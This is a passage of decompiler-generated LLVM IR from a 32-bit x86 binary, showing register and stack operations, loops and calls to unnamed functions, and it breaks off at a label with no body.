  %v2_80505e0 = inttoptr i32 %v1_80505e0 to i32*
  %v3_80505e0 = load i32, i32* %v2_80505e0, align 4
  store i32 %v3_80505e0, i32* %edx.global-to-local, align 4
  %v2_80505e4 = add i32 %v0_80505e0, 44
  %v3_80505e4 = inttoptr i32 %v2_80505e4 to i32*
  store i32 %v3_80505e0, i32* %v3_80505e4, align 4
  br label %dec_label_pc_8050878.backedge

dec_label_pc_80505ed:                             ; preds = %dec_label_pc_805059e, %dec_label_pc_8050597
  %v0_80505ed = call i32 @function_804f478()
  store i32 %v0_80505ed, i32* %eax.global-to-local, align 4
  %v1_80505f2 = inttoptr i32 %v0_80505ed to i32*
  store i32 1, i32* %v1_80505f2, align 4
  br label %dec_label_pc_80508b0

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_805058e
  %v1_80505fd = icmp eq i32 %v3_805058e, 0
  %v1_80505ff = icmp eq i1 %v1_80505fd, false
  br i1 %v1_80505ff, label %dec_label_pc_805080c, label %dec_label_pc_8050605

dec_label_pc_8050605:                             ; preds = %dec_label_pc_80505fd
  %v1_8050605 = add i32 %v0_8050574, 120
  %v2_8050605 = inttoptr i32 %v1_8050605 to i32*
  %v3_8050605 = load i32, i32* %v2_8050605, align 4
  %tmp48 = icmp slt i32 %v3_8050605, 1
  br i1 %tmp48, label %dec_label_pc_8050615, label %dec_label_pc_805060c

dec_label_pc_805060c:                             ; preds = %dec_label_pc_8050605
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_805063454 = add i32 %v0_8050574, 116
  %v3_805063455 = inttoptr i32 %v2_805063454 to i32*
  %v4_805063456 = load i32, i32* %v3_805063455, align 4
  %v5_805063457 = sub i32 0, %v4_805063456
  %v13_805063461 = and i32 %v4_805063456, %v5_805063457
  %v14_805063462 = icmp slt i32 %v13_805063461, 0
  %v16_805063464 = icmp slt i32 %v5_805063457, 0
  %v2_805063865 = icmp eq i1 %v16_805063464, %v14_805063462
  br i1 %v2_805063865, label %dec_label_pc_805063a, label %dec_label_pc_8050625

dec_label_pc_8050615:                             ; preds = %dec_label_pc_8050605
  %v0_8050615 = call i32 @function_804f478()
  store i32 %v0_8050615, i32* %eax.global-to-local, align 4
  %v1_805061a = inttoptr i32 %v0_8050615 to i32*
  store i32 4, i32* %v1_805061a, align 4
  br label %dec_label_pc_80508b0

dec_label_pc_8050625:                             ; preds = %dec_label_pc_805060c, %dec_label_pc_8050625
  %v0_805063c67 = phi i32 [ %v1_8050631, %dec_label_pc_8050625 ], [ %v1_8050574, %dec_label_pc_805060c ]
  %v0_805062566 = phi i32 [ %v0_8050629, %dec_label_pc_8050625 ], [ %v3_805058e, %dec_label_pc_805060c ]
  %v2_8050625 = add i32 %v0_805063c67, -4
  %v3_8050625 = inttoptr i32 %v2_8050625 to i32*
  store i32 %v0_805062566, i32* %v3_8050625, align 4
  %v0_8050626 = load i32, i32* @eax, align 4
  %v2_8050626 = add i32 %v0_805063c67, -8
  %v3_8050626 = inttoptr i32 %v2_8050626 to i32*
  store i32 %v0_8050626, i32* %v3_8050626, align 4
  %v0_8050627 = load i32, i32* @esi, align 4
  %v2_8050627 = add i32 %v0_805063c67, -12
  %v3_8050627 = inttoptr i32 %v2_8050627 to i32*
  store i32 %v0_8050627, i32* %v3_8050627, align 4
  %v2_8050628 = add i32 %v0_805063c67, -16
  %v3_8050628 = inttoptr i32 %v2_8050628 to i32*
  store i32 %v1_805020a, i32* %v3_8050628, align 4
  %v0_8050629 = call i32 @function_8051778()
  store i32 %v0_8050629, i32* @eax, align 4
  %v0_805062e = load i32, i32* @ebx, align 4
  %v1_805062e = add i32 %v0_805062e, 1
  store i32 %v1_805062e, i32* @ebx, align 4
  %v0_805062f = load i32, i32* @esi, align 4
  %v2_805062f = add i32 %v0_805062f, %v0_8050629
  store i32 %v2_805062f, i32* @esi, align 4
  %v0_8050631 = load i32, i32* @esp, align 4
  %v1_8050631 = add i32 %v0_8050631, 16
  %v2_8050634 = add i32 %v0_8050631, 116
  %v3_8050634 = inttoptr i32 %v2_8050634 to i32*
  %v4_8050634 = load i32, i32* %v3_8050634, align 4
  %v5_8050634 = sub i32 %v1_805062e, %v4_8050634
  %v11_8050634 = xor i32 %v4_8050634, %v1_805062e
  %v12_8050634 = xor i32 %v5_8050634, %v1_805062e
  %v13_8050634 = and i32 %v12_8050634, %v11_8050634
  %v14_8050634 = icmp slt i32 %v13_8050634, 0
  %v16_8050634 = icmp slt i32 %v5_8050634, 0
  %v2_8050638 = icmp eq i1 %v16_8050634, %v14_8050634
  br i1 %v2_8050638, label %dec_label_pc_805063a, label %dec_label_pc_8050625

dec_label_pc_805063a:                             ; preds = %dec_label_pc_8050625, %dec_label_pc_805060c
  %v0_805063c.lcssa = phi i32 [ %v1_8050574, %dec_label_pc_805060c ], [ %v1_8050631, %dec_label_pc_8050625 ]
  store i32 0, i32* @ebx, align 4
  %v1_805063c = add i32 %v0_805063c.lcssa, 27
  %v2_805063c = inttoptr i32 %v1_805063c to i8*
  store i8 1, i8* %v2_805063c, align 1
  %v0_805076a.pre = load i32, i32* @ebx, align 4
  %v1_805076a.pre = load i32, i32* @esp, align 4
  %v2_805076a68 = add i32 %v1_805076a.pre, 104
  %v3_805076a69 = inttoptr i32 %v2_805076a68 to i32*
  %v4_805076a70 = load i32, i32* %v3_805076a69, align 4
  %v5_805076a71 = sub i32 %v0_805076a.pre, %v4_805076a70
  %v11_805076a73 = xor i32 %v4_805076a70, %v0_805076a.pre
  %v12_805076a74 = xor i32 %v5_805076a71, %v0_805076a.pre
  %v13_805076a75 = and i32 %v12_805076a74, %v11_805076a73
  %v14_805076a76 = icmp slt i32 %v13_805076a75, 0
  %v16_805076a78 = icmp slt i32 %v5_805076a71, 0
  %v2_805076e79 = icmp eq i1 %v16_805076a78, %v14_805076a76
  br i1 %v2_805076e79, label %dec_label_pc_805077a, label %dec_label_pc_8050770.lr.ph

dec_label_pc_8050770.lr.ph:                       ; preds = %dec_label_pc_805063a
  %v0_8050770.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050770

dec_label_pc_8050646:                             ; preds = %dec_label_pc_8050770
  %v1_8050646 = add i32 %v0_805064680, 116
  store i32 %v1_8050646, i32* %eax.global-to-local, align 4
  %v2_805064a = add i32 %v0_805064680, -4
  %v3_805064a = inttoptr i32 %v2_805064a to i32*
  store i32 %v1_8050646, i32* %v3_805064a, align 4
  %v3_805064b = load i32, i32* %v3_8050770, align 4
  %v5_805064b = add i32 %v0_805064680, -8
  %v6_805064b = inttoptr i32 %v5_805064b to i32*
  store i32 %v3_805064b, i32* %v6_805064b, align 4
  %v0_805064f = load i32, i32* @esi, align 4
  %v2_805064f = add i32 %v0_805064680, -12
  %v3_805064f = inttoptr i32 %v2_805064f to i32*
  store i32 %v0_805064f, i32* %v3_805064f, align 4
  %v2_8050650 = add i32 %v0_805064680, -16
  %v3_8050650 = inttoptr i32 %v2_8050650 to i32*
  store i32 %v1_805020a, i32* %v3_8050650, align 4
  %v0_8050651 = call i32 @function_8051798()
  store i32 %v0_8050651, i32* @eax, align 4
  %v1_8050656 = load i32, i32* @esp, align 4
  %v2_8050656 = add i32 %v1_8050656, 68
  %v3_8050656 = inttoptr i32 %v2_8050656 to i32*
  store i32 %v0_8050651, i32* %v3_8050656, align 4
  %v0_805065a = load i32, i32* @esp, align 4
  %v1_805065a = add i32 %v0_805065a, 16
  %v2_805065d = icmp slt i32 %v0_8050651, 0
  %v1_805065f = icmp eq i1 %v2_805065d, false
  br i1 %v1_805065f, label %dec_label_pc_8050679, label %dec_label_pc_8050661

dec_label_pc_8050661:                             ; preds = %dec_label_pc_8050646
  %v0_8050661 = load i32, i32* @ebx, align 4
  %v1_8050661 = icmp eq i32 %v0_8050661, 0
  br i1 %v1_8050661, label %dec_label_pc_805080c, label %dec_label_pc_8050669

dec_label_pc_8050669:                             ; preds = %dec_label_pc_8050661
  %v1_8050669 = add i32 %v0_805065a, 100
  %v2_8050669 = inttoptr i32 %v1_8050669 to i32*
  %v3_8050669 = load i32, i32* %v2_8050669, align 4
  %v4_8050669 = icmp eq i32 %v3_8050669, 0
  br i1 %v4_8050669, label %dec_label_pc_805080c, label %dec_label_pc_805077a

dec_label_pc_8050679:                             ; preds = %dec_label_pc_8050646
  %v1_8050679 = add i32 %v0_805065a, 43
  %v2_8050679 = inttoptr i32 %v1_8050679 to i8*
  %v3_8050679 = load i8, i8* %v2_8050679, align 1
  %v4_8050679 = icmp eq i8 %v3_8050679, 0
  br i1 %v4_8050679, label %dec_label_pc_805071a, label %dec_label_pc_8050684

dec_label_pc_8050684:                             ; preds = %dec_label_pc_8050679
  %v0_8050684 = load i32, i32* @edi, align 4
  %v1_8050684 = add i32 %v0_8050684, 28
  %v2_8050684 = inttoptr i32 %v1_8050684 to i32*
  %v3_8050684 = load i32, i32* %v2_8050684, align 4
  store i32 %v3_8050684, i32* %eax.global-to-local, align 4
  %v2_8050687 = add i32 %v0_805065a, 160
  %v3_8050687 = inttoptr i32 %v2_8050687 to i32*
  store i32 %v3_8050684, i32* %v3_8050687, align 4
  %v0_805068e = load i32, i32* @edi, align 4
  %v1_805068e = add i32 %v0_805068e, 32
  %v2_805068e = inttoptr i32 %v1_805068e to i32*
  %v3_805068e = load i32, i32* %v2_805068e, align 4
  store i32 %v3_805068e, i32* %eax.global-to-local, align 4
  %v1_8050691 = load i32, i32* @esp, align 4
  %v2_8050691 = add i32 %v1_8050691, 148
  %v3_8050691 = inttoptr i32 %v2_8050691 to i32*
  store i32 %v3_805068e, i32* %v3_8050691, align 4
  %v0_8050698 = load i32, i32* @edi, align 4
  %v1_8050698 = add i32 %v0_8050698, 36
  %v2_8050698 = inttoptr i32 %v1_8050698 to i32*
  %v3_8050698 = load i32, i32* %v2_8050698, align 4
  store i32 %v3_8050698, i32* %eax.global-to-local, align 4
  %v1_805069b = load i32, i32* @esp, align 4
  %v2_805069b = add i32 %v1_805069b, 152
  %v3_805069b = inttoptr i32 %v2_805069b to i32*
  store i32 %v3_8050698, i32* %v3_805069b, align 4
  %v0_80506a2 = load i32, i32* @ecx, align 4
  %v1_80506a2 = load i32, i32* @esp, align 4
  %v2_80506a2 = add i32 %v1_80506a2, -4
  %v3_80506a2 = inttoptr i32 %v2_80506a2 to i32*
  store i32 %v0_80506a2, i32* %v3_80506a2, align 4
  %v1_80506a3 = add i32 %v1_80506a2, -8
  %v2_80506a3 = inttoptr i32 %v1_80506a3 to i32*
  store i32 40, i32* %v2_80506a3, align 4
  %v1_80506a5 = add i32 %v1_80506a2, 116
  store i32 %v1_80506a5, i32* %edx.global-to-local, align 4
  %v2_80506a9 = add i32 %v1_80506a2, -12
  %v3_80506a9 = inttoptr i32 %v2_80506a9 to i32*
  store i32 %v1_80506a5, i32* %v3_80506a9, align 4
  %v0_80506aa = load i32, i32* @edi, align 4
  %v2_80506aa = add i32 %v1_80506a2, -16
  %v3_80506aa = inttoptr i32 %v2_80506aa to i32*
  store i32 %v0_80506aa, i32* %v3_80506aa, align 4
  %v5_80506ab = call i32 @function_804ce38(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v5_80506ab, i32* %eax.global-to-local, align 4
  %v0_80506b0 = load i32, i32* @edi, align 4
  %v1_80506b0 = add i32 %v0_80506b0, 4
  %v2_80506b0 = inttoptr i32 %v1_80506b0 to i32*
  %v3_80506b0 = load i32, i32* %v2_80506b0, align 4
  store i32 %v3_80506b0, i32* %eax.global-to-local, align 4
  %v0_80506b3 = load i32, i32* @esp, align 4
  %v1_80506b3 = add i32 %v0_80506b3, 16
  %v9_80506b6 = icmp eq i32 %v3_80506b0, 24
  br i1 %v9_80506b6, label %dec_label_pc_8050684.dec_label_pc_80506dd_crit_edge, label %dec_label_pc_80506bb

dec_label_pc_8050684.dec_label_pc_80506dd_crit_edge: ; preds = %dec_label_pc_8050684
  %.pre24 = add i32 %v0_80506b3, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_80506dd.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_80506dd

dec_label_pc_80506bb:                             ; preds = %dec_label_pc_8050684
  %v1_80506bb = add i32 %v0_80506b0, 28
  %v2_80506bb = inttoptr i32 %v1_80506bb to i32*
  %v3_80506bb = load i32, i32* %v2_80506bb, align 4
  %v4_80506bb = icmp eq i32 %v3_80506bb, 0
  br i1 %v4_80506bb, label %dec_label_pc_805077a, label %dec_label_pc_80506c5

dec_label_pc_80506c5:                             ; preds = %dec_label_pc_80506bb
  %v1_80506c5 = add i32 %v0_80506b3, 260
  %v2_80506c5 = inttoptr i32 %v1_80506c5 to i32*
  %v3_80506c5 = load i32, i32* %v2_80506c5, align 4
  %v12_80506c5 = icmp eq i32 %v3_80506c5, 1
  br i1 %v12_80506c5, label %dec_label_pc_80506dd, label %dec_label_pc_80506cf

dec_label_pc_80506cf:                             ; preds = %dec_label_pc_80506c5
  %v12_80506cf = icmp eq i32 %v3_80506c5, 28
  %v1_80506d7 = icmp eq i1 %v12_80506cf, false
  br i1 %v1_80506d7, label %dec_label_pc_805077a, label %dec_label_pc_80506dd

dec_label_pc_80506dd:                             ; preds = %dec_label_pc_8050684.dec_label_pc_80506dd_crit_edge, %dec_label_pc_80506cf, %dec_label_pc_80506c5
  %v4_80506dd = phi i32 [ %v4_80506dd.pre, %dec_label_pc_8050684.dec_label_pc_80506dd_crit_edge ], [ %v3_80506c5, %dec_label_pc_80506cf ], [ 1, %dec_label_pc_80506c5 ]
  %v15_80506dd = icmp eq i32 %v3_80506b0, %v4_80506dd
  br i1 %v15_80506dd, label %dec_label_pc_80506f2, label %dec_label_pc_80506e6

dec_label_pc_80506e6:                             ; preds = %dec_label_pc_80506dd
  %v1_80506e9 = inttoptr i32 %v0_80506b0 to i32*
  %v2_80506e9 = load i32, i32* %v1_80506e9, align 4
  %v5_80506e9 = inttoptr i32 %v0_80506b3 to i32*
  store i32 %v2_80506e9, i32* %v5_80506e9, align 4
  %v1_80506eb = call i32 @function_804e0e5(i32 -1)
  store i32 %v1_80506eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050762

dec_label_pc_80506f2:                             ; preds = %dec_label_pc_80506dd
  %v0_80506f2 = load i32, i32* @ebx, align 4
  %v1_80506f4 = sub i32 -1, %v0_80506f2
  store i32 %v1_80506f4, i32* %eax.global-to-local, align 4
  %v2_80506f6 = add i32 %v0_80506b3, 120
  %v3_80506f6 = inttoptr i32 %v2_80506f6 to i32*
  %v4_80506f6 = load i32, i32* %v3_80506f6, align 4
  %v5_80506f6 = add i32 %v4_80506f6, %v1_80506f4
  store i32 %v5_80506f6, i32* %eax.global-to-local, align 4
  %v2_80506fa = add i32 %v0_80506b0, 36
  %v3_80506fa = inttoptr i32 %v2_80506fa to i32*
  store i32 %v5_80506f6, i32* %v3_80506fa, align 4
  %v0_80506fd = load i32, i32* @edi, align 4
  %v1_80506fd = add i32 %v0_80506fd, 16
  %v2_80506fd = inttoptr i32 %v1_80506fd to i32*
  %v3_80506fd = load i32, i32* %v2_80506fd, align 4
  %v1_8050700 = add i32 %v3_80506fd, 4
  store i32 %v1_8050700, i32* %eax.global-to-local, align 4
  %v2_8050703 = add i32 %v0_80506fd, 36
  %v3_8050703 = inttoptr i32 %v2_8050703 to i32*
  %v4_8050703 = load i32, i32* %v3_8050703, align 4
  %v7_8050703 = mul i32 %v4_8050703, %v1_8050700
  store i32 %v7_8050703, i32* %eax.global-to-local, align 4
  %v2_8050707 = add i32 %v0_80506fd, 32
  %v3_8050707 = inttoptr i32 %v2_8050707 to i32*
  %v4_8050707 = load i32, i32* %v3_8050707, align 4
  %v6_805070a = icmp ugt i32 %v7_8050703, %v4_8050707
  br i1 %v6_805070a, label %dec_label_pc_80506f2.dec_label_pc_805077a.loopexit_crit_edge, label %dec_label_pc_805070c

dec_label_pc_80506f2.dec_label_pc_805077a.loopexit_crit_edge: ; preds = %dec_label_pc_80506f2
  %v0_805077a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805077a

dec_label_pc_805070c:                             ; preds = %dec_label_pc_80506f2
  store i32 0, i32* %v3_8050703, align 4
  %v0_8050713 = load i32, i32* @esp, align 4
  %v1_8050713 = add i32 %v0_8050713, 27
  %v2_8050713 = inttoptr i32 %v1_8050713 to i8*
  store i8 0, i8* %v2_8050713, align 1
  %v1_8050765.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050765

dec_label_pc_805071a:                             ; preds = %dec_label_pc_8050679
  %v1_805071d = add i32 %v0_805065a, 132
  %v2_805071d = inttoptr i32 %v1_805071d to i32*
  %v3_805071d = load i32, i32* %v2_805071d, align 4
  %v6_805071d = inttoptr i32 %v0_805065a to i32*
  store i32 %v3_805071d, i32* %v6_805071d, align 4
  %v1_8050724 = call i32 @function_804e0e5(i32 -1)
  store i32 %v1_8050724, i32* %eax.global-to-local, align 4
  %v0_8050729 = load i32, i32* @esp, align 4
  %v1_8050729 = add i32 %v0_8050729, 16
  %v1_805072c = add i32 %v0_8050729, 260
  %v2_805072c = inttoptr i32 %v1_805072c to i32*
  %v3_805072c = load i32, i32* %v2_805072c, align 4
  store i32 %v3_805072c, i32* %eax.global-to-local, align 4
  %v1_8050733 = add i32 %v0_8050729, 136
  %v2_8050733 = inttoptr i32 %v1_8050733 to i32*
  %v3_8050733 = load i32, i32* %v2_8050733, align 4
  %v15_8050733 = icmp eq i32 %v3_8050733, %v3_805072c
  %v1_8050737 = icmp eq i1 %v15_8050733, false
  br i1 %v1_8050737, label %dec_label_pc_8050765, label %dec_label_pc_8050739

dec_label_pc_8050739:                             ; preds = %dec_label_pc_805071a
  %v0_8050739 = load i32, i32* @edi, align 4
  %v1_8050739 = add i32 %v0_8050739, 16
  %v2_8050739 = inttoptr i32 %v1_8050739 to i32*
  %v3_8050739 = load i32, i32* %v2_8050739, align 4
  store i32 %v3_8050739, i32* %eax.global-to-local, align 4
  %v2_805073c = add i32 %v0_8050729, 148
  %v3_805073c = inttoptr i32 %v2_805073c to i32*
  %v4_805073c = load i32, i32* %v3_805073c, align 4
  %v15_805073c = icmp eq i32 %v3_8050739, %v4_805073c
  %v1_8050743 = icmp eq i1 %v15_805073c, false
  br i1 %v1_8050743, label %dec_label_pc_80507ff, label %dec_label_pc_8050749

dec_label_pc_8050749:                             ; preds = %dec_label_pc_8050739
  %v0_8050749 = load i32, i32* @edx, align 4
  %v2_8050749 = add i32 %v0_8050729, 12
  %v3_8050749 = inttoptr i32 %v2_8050749 to i32*
  store i32 %v0_8050749, i32* %v3_8050749, align 4
  %v0_805074a = load i32, i32* %eax.global-to-local, align 4
  %v2_805074a = add i32 %v0_8050729, 8
  %v3_805074a = inttoptr i32 %v2_805074a to i32*
  store i32 %v0_805074a, i32* %v3_805074a, align 4
  %v1_805074b = add i32 %v0_8050729, 152
  %v2_805074b = inttoptr i32 %v1_805074b to i32*
  %v3_805074b = load i32, i32* %v2_805074b, align 4
  %v5_805074b = add i32 %v0_8050729, 4
  %v6_805074b = inttoptr i32 %v5_805074b to i32*
  store i32 %v3_805074b, i32* %v6_805074b, align 4
  %v0_8050752 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050752 = load i32, i32* @edi, align 4
  %v2_8050752 = add i32 %v1_8050752, 36
  %v3_8050752 = inttoptr i32 %v2_8050752 to i32*
  %v4_8050752 = load i32, i32* %v3_8050752, align 4
  %v7_8050752 = mul i32 %v4_8050752, %v0_8050752
  store i32 %v7_8050752, i32* %eax.global-to-local, align 4
  %v2_8050756 = add i32 %v1_8050752, 28
  %v3_8050756 = inttoptr i32 %v2_8050756 to i32*
  %v4_8050756 = load i32, i32* %v3_8050756, align 4
  %v5_8050756 = add i32 %v4_8050756, %v7_8050752
  store i32 %v5_8050756, i32* %eax.global-to-local, align 4
  %v3_8050759 = inttoptr i32 %v0_8050729 to i32*
  store i32 %v5_8050756, i32* %v3_8050759, align 4
  %v5_805075a = call i32 @function_804ce38(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050298, i32 %v3_80502f7)
  store i32 %v5_805075a, i32* %eax.global-to-local, align 4
  %v0_805075f = load i32, i32* @edi, align 4
  %v1_805075f = add i32 %v0_805075f, 36
  %v2_805075f = inttoptr i32 %v1_805075f to i32*
  %v3_805075f = load i32, i32* %v2_805075f, align 4
  %v4_805075f = add i32 %v3_805075f, 1
  store i32 %v4_805075f, i32* %v2_805075f, align 4
  br label %dec_label_pc_8050762

dec_label_pc_8050762:                             ; preds = %dec_label_pc_80506e6, %dec_label_pc_8050749
  %v0_8050762 = load i32, i32* @esp, align 4
  %v1_8050762 = add i32 %v0_8050762, 16
  br label %dec_label_pc_8050765

dec_label_pc_8050765:                             ; preds = %dec_label_pc_805071a, %dec_label_pc_805070c, %dec_label_pc_8050762
  %v1_8050765 = phi i32 [ %v1_8050729, %dec_label_pc_805071a ], [ %v1_8050765.pre, %dec_label_pc_805070c ], [ %v1_8050762, %dec_label_pc_8050762 ]
  %v0_8050765 = load i32, i32* @esi, align 4
  %v2_8050765 = add i32 %v1_8050765, 52
  %v3_8050765 = inttoptr i32 %v2_8050765 to i32*
  %v4_8050765 = load i32, i32* %v3_8050765, align 4
  %v5_8050765 = add i32 %v4_8050765, %v0_8050765
  store i32 %v5_8050765, i32* @esi, align 4
  %v0_8050769 = load i32, i32* @ebx, align 4
  %v1_8050769 = add i32 %v0_8050769, 1
  store i32 %v1_8050769, i32* @ebx, align 4
  %v2_805076a = add i32 %v1_8050765, 104
  %v3_805076a = inttoptr i32 %v2_805076a to i32*
  %v4_805076a = load i32, i32* %v3_805076a, align 4
  %v5_805076a = sub i32 %v1_8050769, %v4_805076a
  %v11_805076a = xor i32 %v4_805076a, %v1_8050769
  %v12_805076a = xor i32 %v5_805076a, %v1_8050769
  %v13_805076a = and i32 %v12_805076a, %v11_805076a
  %v14_805076a = icmp slt i32 %v13_805076a, 0
  %v16_805076a = icmp slt i32 %v5_805076a, 0
  %v2_805076e = icmp eq i1 %v16_805076a, %v14_805076a
  br i1 %v2_805076e, label %dec_label_pc_805077a, label %dec_label_pc_8050770

dec_label_pc_8050770:                             ; preds = %dec_label_pc_8050770.lr.ph, %dec_label_pc_8050765
  %v0_8050770 = phi i32 [ %v0_8050770.pre, %dec_label_pc_8050770.lr.ph ], [ %v5_8050765, %dec_label_pc_8050765 ]
  %v0_805064680 = phi i32 [ %v1_805076a.pre, %dec_label_pc_8050770.lr.ph ], [ %v1_8050765, %dec_label_pc_8050765 ]
  %v2_8050770 = add i32 %v0_805064680, 16
  %v3_8050770 = inttoptr i32 %v2_8050770 to i32*
  %v4_8050770 = load i32, i32* %v3_8050770, align 4
  %v5_8050770 = sub i32 %v0_8050770, %v4_8050770
  %v11_8050770 = xor i32 %v4_8050770, %v0_8050770
  %v12_8050770 = xor i32 %v5_8050770, %v0_8050770
  %v13_8050770 = and i32 %v12_8050770, %v11_8050770
  %v14_8050770 = icmp slt i32 %v13_8050770, 0
  %v16_8050770 = icmp slt i32 %v5_8050770, 0
  %v2_8050774 = icmp eq i1 %v16_8050770, %v14_8050770
  br i1 %v2_8050774, label %dec_label_pc_805077a, label %dec_label_pc_8050646

dec_label_pc_805077a:                             ; preds = %dec_label_pc_8050669, %dec_label_pc_805063a, %dec_label_pc_8050765, %dec_label_pc_80506bb, %dec_label_pc_80506cf, %dec_label_pc_8050770, %dec_label_pc_80506f2.dec_label_pc_805077a.loopexit_crit_edge
  %v0_805077a = phi i32 [ %v0_805077a.pre.pre, %dec_label_pc_80506f2.dec_label_pc_805077a.loopexit_crit_edge ], [ %v1_805076a.pre, %dec_label_pc_805063a ], [ %v1_8050765, %dec_label_pc_8050765 ], [ %v1_80506b3, %dec_label_pc_80506bb ], [ %v1_80506b3, %dec_label_pc_80506cf ], [ %v0_805064680, %dec_label_pc_8050770 ], [ %v1_805065a, %dec_label_pc_8050669 ]
  %v1_805077d = add i32 %v0_805077a, 20
  %v2_805077d = inttoptr i32 %v1_805077d to i32*
  %v3_805077d = load i32, i32* %v2_805077d, align 4
  %v5_805077d = add i32 %v0_805077a, -16
  %v6_805077d = inttoptr i32 %v5_805077d to i32*
  store i32 %v3_805077d, i32* %v6_805077d, align 4
  %v1_8050781 = call i32 @function_804b2bc(i32 -1)
  store i32 %v1_8050781, i32* %eax.global-to-local, align 4
  %v0_8050786 = load i32, i32* @esp, align 4
  %v1_8050789 = add i32 %v0_8050786, 272
  %v2_8050789 = inttoptr i32 %v1_8050789 to i32*
  %v3_8050789 = load i32, i32* %v2_8050789, align 4
  %v4_8050789 = icmp eq i32 %v3_8050789, 0
  br i1 %v4_8050789, label %dec_label_pc_805079e, label %dec_label_pc_8050793

dec_label_pc_8050793:                             ; preds = %dec_label_pc_805077a
  store i32 %v3_8050789, i32* %edx.global-to-local, align 4
  %v2_805079a = inttoptr i32 %v3_8050789 to i32*
  store i32 %v1_805020a, i32* %v2_805079a, align 4
  %v0_80507aa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80507aa

dec_label_pc_805079e:                             ; preds = %dec_label_pc_805077a
  %v3_80507a1 = inttoptr i32 %v0_8050786 to i32*
  store i32 %v1_805020a, i32* %v3_80507a1, align 4
  %v1_80507a2 = call i32 @function_804e0e5(i32 -1)
  store i32 %v1_80507a2, i32* %eax.global-to-local, align 4
  %v0_80507a7 = load i32, i32* @esp, align 4
  %v1_80507a7 = add i32 %v0_80507a7, 16
  br label %dec_label_pc_80507aa

dec_label_pc_80507aa:                             ; preds = %dec_label_pc_8050793, %dec_label_pc_805079e
  %v0_80507aa = phi i32 [ %v0_80507aa.pre, %dec_label_pc_8050793 ], [ %v1_80507a7, %dec_label_pc_805079e ]
  %v1_80507ad = add i32 %v0_80507aa, 12
  %v2_80507ad = inttoptr i32 %v1_80507ad to i32*
  %v3_80507ad = load i32, i32* %v2_80507ad, align 4
  %v5_80507ad = add i32 %v0_80507aa, -16
  %v6_80507ad = inttoptr i32 %v5_80507ad to i32*
  store i32 %v3_80507ad, i32* %v6_80507ad, align 4
  %v1_80507b1 = call i32 @function_804e0e5(i32 -1)
  store i32 %v1_80507b1, i32* @eax, align 4
  %v0_80507b6 = load i32, i32* @esp, align 4
  %v1_80507b9 = add i32 %v0_80507b6, 8
  %v2_80507b9 = inttoptr i32 %v1_80507b9 to i32*
  store i32 ptrtoint (i32* @global_var_80580c8.194 to i32), i32* %v2_80507b9, align 4
  %v1_80507be = add i32 %v0_80507b6, 4
  %v2_80507be = inttoptr i32 %v1_80507be to i32*
  store i32 134540395, i32* %v2_80507be, align 4
  %v1_80507c3 = add i32 %v0_80507b6, 200
  store i32 %v1_80507c3, i32* %ebx.global-to-local, align 4
  %v3_80507ca = inttoptr i32 %v0_80507b6 to i32*
  store i32 %v1_80507c3, i32* %v3_80507ca, align 4
  %v2_80507cb = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_80507cb, i32* %eax.global-to-local, align 4
  %v0_80507d0 = load i32, i32* @esp, align 4
  %v1_80507d0 = inttoptr i32 %v0_80507d0 to i32*
  store i32 ptrtoint (i32* @global_var_80580c8.194 to i32), i32* %v1_80507d0, align 4
  %v1_80507d7 = call i32 @function_804ec6b(i32 -1)
  store i32 %v1_80507d7, i32* %eax.global-to-local, align 4
  %v0_80507dc = load i32, i32* @esp, align 4
  %v1_80507dc = add i32 %v0_80507dc, 56
  %v2_80507dc = inttoptr i32 %v1_80507dc to i32*
  %v3_80507dc = load i32, i32* %v2_80507dc, align 4
  store i32 %v3_80507dc, i32* @eax, align 4
  %v1_80507e0 = add i32 %v0_80507dc, 72
  %v2_80507e0 = inttoptr i32 %v1_80507e0 to i32*
  %v3_80507e0 = load i32, i32* %v2_80507e0, align 4
  store i32 %v3_80507e0, i32* %edx.global-to-local, align 4
  %v1_80507e4 = inttoptr i32 %v0_80507dc to i32*
  %v3_80507e4 = add i32 %v0_80507dc, 4
  %v1_80507e5 = inttoptr i32 %v3_80507e4 to i32*
  store i32 1, i32* %v1_80507e5, align 4
  %v0_80507e8 = load i32, i32* @eax, align 4
  %v1_80507e8 = sext i32 %v0_80507e8 to i64
  store i64 %v1_80507e8, i64* @global_var_80580e0.195, align 32
  %v0_80507ed = load i32, i32* %edx.global-to-local, align 4
  %v1_80507ed = trunc i32 %v0_80507ed to i16
  store i16 %v1_80507ed, i16* @global_var_80559ec.196, align 4
  %v0_80507f4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80507f4, i32* %v1_80507e4, align 4
  %v2_80507f5 = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_80507f5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050936

dec_label_pc_80507ff:                             ; preds = %dec_label_pc_8050739
  %v1_8050802 = inttoptr i32 %v0_8050739 to i32*
  %v2_8050802 = load i32, i32* %v1_8050802, align 4
  %v5_8050802 = inttoptr i32 %v0_8050729 to i32*
  store i32 %v2_8050802, i32* %v5_8050802, align 4
  %v1_8050804 = call i32 @function_804e0e5(i32 -1)
  store i32 %v1_8050804, i32* @eax, align 4
  %v0_8050809 = load i32, i32* @esp, align 4
  %v1_8050809 = add i32 %v0_8050809, 16
  br label %dec_label_pc_805080c

dec_label_pc_805080c:                             ; preds = %dec_label_pc_805053e, %dec_label_pc_8050669, %dec_label_pc_8050661, %dec_label_pc_80505fd, %dec_label_pc_8050583, %dec_label_pc_805055f, %dec_label_pc_80507ff
